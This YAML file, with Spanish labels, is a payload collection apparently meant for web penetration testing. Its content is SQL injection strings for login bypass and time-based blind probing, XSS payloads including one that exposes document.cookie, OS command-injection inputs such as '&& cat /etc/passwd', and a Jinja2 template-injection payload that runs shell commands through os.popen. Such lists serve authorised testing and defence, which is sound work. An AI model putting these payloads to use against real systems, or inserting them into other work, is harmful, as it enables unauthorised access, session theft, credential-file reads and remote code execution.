
version: "2.0"
description: "Colección de payloads para SQLi, XSS, OS Command Injection y SSTI"

vulnerabilities:
  sqli:
    - technique: "Autenticación / Basado en Booleanos"
      payloads:
        - "' OR '1'='1"
        - "admin' --"
    - technique: "Basado en Tiempo (Time-Based Blind)"
      payloads:
        - "1' AND SLEEP(5)--+"
        - "1'||pg_sleep(5)--"

  xss:
    - technique: "Reflejado Básico (HTML Context)"
      payloads:
        - "<script>alert(1)</script>"
        - "<svg/onload=alert(1)>"
    - technique: "Evasión de Atributos"
      payloads:
        - "\"><img src=x onerror=prompt(document.cookie)>"

  # ==========================================
  # NUEVO: INYECCIÓN DE COMANDOS OS
  # ==========================================
  os_command:
    - technique: "Concatenación de Comandos (Linux/Unix)"
      description: "Uso de operadores de shell para ejecutar comandos adicionales."
      payloads:
        - "; id"
        - "| whoami"
        - "&& cat /etc/passwd"
        - "`whoami`"
    - technique: "Concatenación de Comandos (Windows)"
      description: "Operadores específicos para la consola de Windows."
      payloads:
        - "& whoami"
        - "| dir"

  # ==========================================
  # NUEVO: SERVER-SIDE TEMPLATE INJECTION (SSTI)
  # ==========================================
  ssti:
    - technique: "Evaluación Matemática Básica"
      description: "Prueba si el motor de plantillas evalúa expresiones matemáticas (7*7=49)."
      payloads:
        - "{{7*7}}"          # Jinja2 (Python), Twig (PHP)
        - "${7*7}"           # FreeMarker (Java)
        - "<%= 7*7 %>"       # ERB (Ruby)
        - "#{7*7}"           # Pug/Jade (Node.js)
    - technique: "Ejecución de Código (Jinja2/Python)"
      description: "Intento de acceder a clases base para ejecutar comandos."
      payloads:
        - "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
